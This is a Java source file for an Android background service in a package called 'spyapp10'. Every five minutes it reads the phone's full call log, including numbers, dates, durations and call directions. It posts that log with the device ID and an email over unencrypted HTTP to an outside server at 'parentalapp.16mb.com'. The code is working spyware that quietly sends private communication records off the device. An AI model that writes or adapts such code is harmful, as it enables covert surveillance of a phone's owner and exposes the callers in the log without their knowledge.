package com.example.vipul.spyapp10;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class callLogService extends Service {
    public callLogService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        getCallDetails(getApplicationContext());
                        sleep(300000);
                    } catch (Exception e) {
                    }
                }
            }
        };
        runnable.start();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void getCallDetails(Context context) {
        String phNumber="", callType="", callDate="", callDuration="",time="",dir="",calltype="";
        try{
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            cursor.moveToLast();

            Log.e("myservice", "callServiceStarted");
            while (!cursor.isFirst()) {
                phNumber += cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))+"||";
                Date callDayTime = new Date(Long.valueOf(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))));
                time +="DAY-"+new SimpleDateFormat("yyyy-MM-dd").format(callDayTime)+ "   TIME-"+
                        new SimpleDateFormat("HH:mm").format(callDayTime) + "||";
                callDuration += cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))+"sec||";
                int dircode = Integer.parseInt(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                calltype+=dir+"||";
                cursor.moveToPrevious();
            }
            String Email=MainActivity.EMAIL;
            String DeviceId=Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;

            Log.e("myservice",phNumber);
            new UpdateUserDetailCALL().execute(Email, DeviceId, phNumber,calltype, time, callDuration);
            cursor.close();
        }catch (Exception e){
            Log.e("myservice","errorCALLLOG");
        }
    }
    private class UpdateUserDetailCALL extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/calldet.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(6);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("phone", params[2]));
                nameValuePair.add(new BasicNameValuePair("type", params[3]));
                nameValuePair.add(new BasicNameValuePair("time", params[4]));
                nameValuePair.add(new BasicNameValuePair("duration", params[5]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}
